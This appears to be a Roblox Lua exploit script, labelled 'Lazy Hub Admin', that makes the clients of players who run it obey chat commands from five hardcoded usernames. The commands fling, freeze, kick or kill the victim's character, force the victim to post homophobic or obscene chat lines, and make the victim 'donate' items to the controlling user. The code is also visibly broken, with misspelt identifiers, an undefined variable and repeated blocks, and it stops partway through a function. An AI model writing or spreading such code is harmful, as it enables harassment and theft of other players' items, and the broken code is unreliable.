--// Cmdx User //--
local user_premium__001 = game.Players.FlavorgamerYT
local user_premium__002 = game.Players.whoareyiu24
local user_premium__003 = game.Players.LittleJonib
local user_premium__004 = game.Players.xylar10e
local user_premium__005 = game.Players.ridwanramadhan131
local player = game.Players.LocalPlayer

--// Commands //--
local freeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
end

local unfreeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
end

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".fling .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
			power = 9999999999999999999999 -- change this to make it more or less powerful
 
			game:GetService('RunService').Stepped:connect(function()
			game.Players.LocalPlayer.Character.Head.CanCollide = false
			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			end)
			wait(.1)
			local bambam = Instance.new("BodyThrust")
			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
			bambam.Force = Vector3.new(power,0,power)
			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".freeze .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			freeze()
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".unfreeze .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			unfreeze()
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".kick .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer:kick("You have been kicked.")
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".oof .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".error .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".bring .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__001.Character.UpperTorso.Position)
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".sit .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			local character = game.Players.LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.Sit = true
				end
			end
		end
	end
end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".troll .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
		end
	end
end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".unsit .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			local character = game.Players.LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.Sit = false
				end
			end
		end
	end
end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".enlighten .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Backpack:FindFirstChild("The Arkenstone"):Equip()
			game.Players:Chat(";enlighten " .. user_premium__001)
		end
	end
end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".donate ." .. text) then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players:Chat(";donate " .. text .. " " .. user_premium__001)
		end
	end
end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".say ." .. text ) then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
		end
	end
end)

---------------------------------------------------------------------

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".cmdx") then
		if game.Players.LocalPlayer == user_premium__001 then
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Lazy Hub Admin";
	Text = ".freeze .bring .error .oof .kick .fling .sit .unsit .troll .donate .say .enlighten";
	Time = 10;
	Icon = "rbxassetid://999999999";
}) 
		end
	end

end)

---------------------------------------------------------------------

local freeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
end

local unfreeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
end

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".fling .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
			power = 99999999 -- change this to make it more or less powerful
 
			game:GetService('RunService').Stepped:connect(function()
			game.Players.LocalPlayer.Character.Head.CanCollide = false
			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			end)
			wait(.1)
			local bambam = Instance.new("BodyThrust")
			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
			bambam.Force = Vector3.new(power,0,power)
			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		end
	end

end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".freeze .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			freeze()
		end
	end

end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".unfreeze .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			unfreeze()
		end
	end

end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".kick .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game.Players.LocalPlayer:kick("You have been Kicked by Lazy Hub Admin.")
		end
	end

end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".oof .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
		end
	end

end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".error .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
		end
	end

end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".bring .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__002.Character.UpperTorso.Position)
		end
	end

end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".sit .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			local character = game.Players.LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.Sit = true
				end
			end
		end
	end
end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".troll .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
		end
	end
end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".unsit .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			local character = game.Players.LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.Sit = false
				end
			end
		end
	end
end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".enlighten .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game.Players.LocalPlayer.Backpack:FindFirstChild("The Arkenstone"):Equip()
			game.Players:Chat(";enlighten " .. user_premium__002)
		end
	end
end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".donate ." .. text) then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game.Players:Chat(";donate " .. text .. " " .. user_premium__002)
		end
	end
end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".say ." .. text ) then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
		end
	end
end)

---------------------------------------------------------------------

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".cmdx") then
		if game.Players.LocalPlayer == user_premium__002 then
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = ".";
	Text = ".freeze .bring .error .oof .kick .fling .sit .unsit .troll .donate .say .enlighten";
	Time = 5;
	Icon = "rbxassetid://999999999";
}) 
		end
	end

end)

---------------------------------------------------------------------
local freeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
end

local unfreeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
end

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".fling .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
			power = 99999999 -- change this to make it more or less powerful
 
			game:GetService('RunService').Stepped:connect(function()
			game.Players.LocalPlayer.Character.Head.CanCollide = false
			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			end)
			wait(.1)
			local bambam = Instance.new("BodyThrust")
			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
			bambam.Force = Vector3.new(power,0,power)
			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		end
	end

end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".freeze .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			freeze()
		end
	end

end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".unfreeze .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			unfreeze()
		end
	end

end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".kick .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game.Players.LocalPlayer:kick("You have been kicked.")
		end
	end

end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".oof .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
		end
	end

end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".error .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
		end
	end

end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".bring .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__003.Character.UpperTorso.Position)
		end
	end

end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".sit .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			local character = game.Players.LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.Sit = true
				end
			end
		end
	end
end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".troll .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
		end
	end
end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".unsit .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			local character = game.Players.LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.Sit = false
				end
			end
		end
	end
end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".enlighten .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game.Players.LocalPlayer.Backpack:FindFirstChild("The Arkenstone"):Equip()
			game.Players:Chat(";enlighten " .. user_premium__003)
		end
	end
end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".donate ." .. text) then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game.Players:Chat(";donate " .. text .. " " .. user_premium__003)
		end
	end
end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".say ." .. text ) then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
		end
	end
end)

---------------------------------------------------------------------

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".cmdx") then
		if game.Players.LocalPlayer == user_premium__003 then
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = ".";
	Text = ".freeze .bring .error .oof .kick .fling .sit .unsit .troll .donate .say .enlighten";
	Time = 5;
	Icon = "rbxassetid://999999999";
}) 
		end
	end

end)

---------------------------------------------------------------------
local freeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
end

local unfreeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
end

user_premium__004.Chatted:connect(function(cht)
	if cht:match(".fling .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
			power = 99999999 -- change this to make it more or less powerful
 
			game:GetService('RunService').Stepped:connect(function()
			game.Players.LocalPlayer.Character.Head.CanCollide = false
			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			end)
			wait(.1)
			local bambam = Instance.new("BodyThrust")
			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
			bambam.Force = Vector3.new(power,0,power)
			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		end
	end

end)

user_premium__004.Chatted:connect(function(cht)
	if cht:match(".freeze .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			freeze()
		end
	end

end)

user_premium__004.Chatted:connect(function(cht)
	if cht:match(".unfreeze .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			unfreeze()
		end
	end

end)

user_premium__004.Chatted:connect(function(cht)
	if cht:match(".kick .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game.Players.LocalPlayer:kick("You have been kicked By Lazy Hub Admin.")
		end
	end

end)

user_premium__004.Chatted:connect(function(cht)
	if cht:match(".oof .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
		end
	end

end)

user_premium__004.Chatted:connect(function(cht)
	if cht:match(".error .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
		end
	end

end)

user_premium__004.Chatted:connect(function(cht)
	if cht:match(".bring .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__004.Character.UpperTorso.Position)
		end
	end

end)

user_premium__004.Chatted:connect(function(cht)
	if cht:match(".sit .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			local character = game.Players.LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.Sit = true
				end
			end
		end
	end
end)

user_premium__004.Chatted:connect(function(cht)
	if cht:match(".troll .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I'm Соck FUСКER", "All")
		end
	end
end)

user_premium__004.Chatted:connect(function(cht)
	if cht:match(".unsit .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			local character = game.Players.LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.Sit = false
				end
			end
		end
	end
end)

user_premium__004.Chatted:connect(function(cht)
	if cht:match(".enlighten .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game.Players.LocalPlayer.Backpack:FindFirstChild("The Arkenstone"):Equip()
			game.Players:Chat(";enlighten " .. user_premium__004)
		end
	end
end)

user_premium__004.Chatted:connect(function(cht)
	if cht:match(".donate ." .. text) then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game.Players:Chat(";donate " .. text .. " " .. user_premium__004)
		end
	end
end)

user_premium__004.Chatted:connect(function(cht)
	if cht:match(".say ." .. text ) then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
		end
	end
end)

---------------------------------------------------------------------

user_premium__004.Chatted:connect(function(cht)
	if cht:match(".cmdx") then
		if game.Players.LocalPlayer == user_premium__004 then
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "player fucker";
	Text = ".freeze .bring .error .oof .kick .fling .sit .unsit .troll .donate .say .enlighten";
	Time = 5;
	Icon = "rbxassetid://999999999";
}) 
		end
	end

end)

---------------------------------------------------------------------
--// Cmdx User //--
local user_premium__001 = game.Players.FlavorgamerYT
local user_premium__002 = game.Players.whoareyiu24
local user_premium__003 = game.Players.LittleJonib
local user_premium__004 = game.Players.xylar10e
local player = game.Players.LocalPlayer

--// Commands //--
local freeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
end

local unfreeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
end

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".fling .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
			power = 9999999999999999999999 -- change this to make it more or less powerful
 
			game:GetService('RunService').Stepped:connect(function()
			game.Players.LocalPlayer.Character.Head.CanCollide = false
			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			end)
			wait(.1)
			local bambam = Instance.new("BodyThrust")
			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
			bambam.Force = Vector3.new(power,0,power)
			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".freeze .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			freeze()
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".unfreeze .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			unfreeze()
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".kick .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer:kick("You have been kicked.")
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".oof .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".error .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".bring .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__001.Character.UpperTorso.Position)
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".sit .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			local character = game.Players.LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.Sit = true
				end
			end
		end
	end
end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".troll .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
		end
	end
end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".unsit .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			local character = game.Players.LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.Sit = false
				end
			end
		end
	end
end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".enlighten .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Backpack:FindFirstChild("The Arkenstone"):Equip()
			game.Players:Chat(";enlighten " .. user_premium__001)
		end
	end
end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".donate ." .. text) then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players:Chat(";donate " .. text .. " " .. user_premium__001)
		end
	end
end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".say ." .. text ) then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
		end
	end
end)

---------------------------------------------------------------------

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".cmdx") then
		if game.Players.LocalPlayer == user_premium__001 then
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Lazy Hub Admin";
	Text = ".freeze .bring .error .oof .kick .fling .sit .unsit .troll .donate .say .enlighten";
	Time = 10;
	Icon = "rbxassetid://999999999";
}) 
		end
	end

end)

---------------------------------------------------------------------

local freeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
end

local unfreeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
end

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".fling .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
			power = 99999999 -- change this to make it more or less powerful
 
			game:GetService('RunService').Stepped:connect(function()
			game.Players.LocalPlayer.Character.Head.CanCollide = false
			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			end)
			wait(.1)
			local bambam = Instance.new("BodyThrust")
			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
			bambam.Force = Vector3.new(power,0,power)
			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		end
	end

end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".freeze .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			freeze()
		end
	end

end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".unfreeze .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			unfreeze()
		end
	end

end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".kick .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game.Players.LocalPlayer:kick("You have been Kicked by Lazy Hub Admin.")
		end
	end

end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".oof .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
		end
	end

end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".error .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
		end
	end

end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".bring .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__002.Character.UpperTorso.Position)
		end
	end

end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".sit .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			local character = game.Players.LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.Sit = true
				end
			end
		end
	end
end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".troll .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
		end
	end
end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".unsit .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			local character = game.Players.LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.Sit = false
				end
			end
		end
	end
end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".enlighten .") then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game.Players.LocalPlayer.Backpack:FindFirstChild("The Arkenstone"):Equip()
			game.Players:Chat(";enlighten " .. user_premium__002)
		end
	end
end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".donate ." .. text) then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game.Players:Chat(";donate " .. text .. " " .. user_premium__002)
		end
	end
end)

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".say ." .. text ) then
		if game.Players.LocalPlayer ~= user_premium__002 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
		end
	end
end)

---------------------------------------------------------------------

user_premium__002.Chatted:connect(function(cht)
	if cht:match(".cmdx") then
		if game.Players.LocalPlayer == user_premium__002 then
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = ".";
	Text = ".freeze .bring .error .oof .kick .fling .sit .unsit .troll .donate .say .enlighten";
	Time = 5;
	Icon = "rbxassetid://999999999";
}) 
		end
	end

end)

---------------------------------------------------------------------
local freeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
end

local unfreeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
end

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".fling .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
			power = 99999999 -- change this to make it more or less powerful
 
			game:GetService('RunService').Stepped:connect(function()
			game.Players.LocalPlayer.Character.Head.CanCollide = false
			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			end)
			wait(.1)
			local bambam = Instance.new("BodyThrust")
			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
			bambam.Force = Vector3.new(power,0,power)
			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		end
	end

end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".freeze .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			freeze()
		end
	end

end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".unfreeze .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			unfreeze()
		end
	end

end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".kick .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game.Players.LocalPlayer:kick("You have been kicked.")
		end
	end

end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".oof .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
		end
	end

end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".error .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
		end
	end

end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".bring .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__003.Character.UpperTorso.Position)
		end
	end

end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".sit .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			local character = game.Players.LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.Sit = true
				end
			end
		end
	end
end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".troll .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
		end
	end
end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".unsit .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
			local character = game.Players.LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.Sit = false
				end
			end
		end
	end
end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".enlighten .") then
		if game.Players.LocalPlayer ~= user_premium__003 then
